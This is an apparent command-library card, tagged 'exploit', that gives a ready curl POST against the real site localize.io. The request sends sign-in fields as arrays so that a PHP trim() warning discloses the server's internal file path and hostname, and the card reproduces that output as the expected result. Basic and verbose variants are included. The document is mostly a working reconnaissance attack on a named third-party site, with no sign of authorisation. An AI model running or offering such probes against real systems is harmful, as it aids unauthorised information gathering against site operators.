---
id: cmd-post-malformed-signin-localize
data: >-
  curl -X POST http://www.localize.io/ -d
  "sign_in[username][]=test&sign_in[password][]=test"
tags:
  - exploit
  - web
  - information-disclosure
type: command
output: >-
  Warning: trim() expects parameter 1 to be string, array given in
  /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/index.php
  on line 732

  ... (additional response content)
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:11.943Z'
verified: false
validated: true
submitted: true
---
# post-malformed-signin-localize

## Command

```bash
curl -X POST http://www.localize.io/ -d "sign_in[username][]=test&sign_in[password][]=test"
```

## Description

Submits a POST request to the sign-in endpoint of localize.io with username and password parameters formatted as arrays using [] notation, triggering a PHP trim() error that discloses the server file path.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `http://www.localize.io/` | Target URL for the sign-in endpoint | Yes |
| `-d "sign_in[username][]=test&sign_in[password][]=test"` | POST data with array-formatted credentials | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://www.localize.io/ -d "sign_in[username][]=test&sign_in[password][]=test"
```

### Advanced Usage

```bash
curl -X POST http://www.localize.io/ -d "sign_in[username][]=test&sign_in[password][]=test" -v
```

> Includes verbose mode to inspect headers and full response.

## Expected Output

Response includes a PHP warning: "Warning: trim() expects parameter 1 to be string, array given in /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/index.php on line 732", along with any error page content.

## Related

- [[Related Procedure|procedures/Trigger-PHP-Trim-Error-for-Path-Disclosure]]
